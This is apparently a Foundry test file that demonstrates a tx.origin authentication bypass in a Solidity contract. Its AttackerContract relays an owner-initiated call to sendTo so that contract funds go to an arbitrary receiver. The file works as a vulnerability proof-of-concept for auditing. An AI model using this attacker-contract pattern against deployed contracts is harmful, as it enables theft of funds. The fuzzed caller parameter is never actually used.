
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract TestAccessControlMyContract is Test {

    MyContract public _contractUnderTest;
    address public owner;

    function setUp() public {
        owner = address(this);
        _contractUnderTest = new MyContract();
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint256 amount) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner - the only privileged role
        vm.assume(caller != owner);
        
        // Constrain receiver to be valid
        vm.assume(receiver != address(0));
        vm.assume(receiver != address(vm));
        vm.assume(receiver != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Constrain amount to be within contract balance
        vm.assume(amount > 0 && amount <= address(_contractUnderTest).balance);

        // --- 2. State Configuration ---
        
        // The contract is already funded in setUp
        // Record receiver balance before the call
        uint256 receiverBalanceBefore = receiver.balance;

        // --- 3. Execution & Assertion ---
        
        // The vulnerability is that tx.origin == owner check can be bypassed
        // when the owner initiates a transaction that calls an attacker's contract,
        // which then calls sendTo. In this case, tx.origin would still be owner.
        
        // To demonstrate this, we simulate the owner calling an intermediary contract
        // that then calls sendTo on behalf of an arbitrary caller.
        
        // Deploy attacker contract
        AttackerContract attacker = new AttackerContract(address(_contractUnderTest));
        
        // The owner (this contract) calls the attacker contract
        // tx.origin will be owner, but msg.sender to sendTo will be the attacker contract
        attacker.attack(receiver, amount);

        // Assert that the transfer succeeded - proving the vulnerability
        assertEq(receiver.balance, receiverBalanceBefore + amount, "Transfer should have succeeded via tx.origin bypass");
    }
}

contract AttackerContract {
    MyContract public target;
    
    constructor(address _target) {
        target = MyContract(_target);
    }
    
    function attack(address payable receiver, uint256 amount) external {
        // When called by the owner, tx.origin will be the owner
        // This bypasses the tx.origin check even though msg.sender is this contract
        target.sendTo(receiver, amount);
    }
}
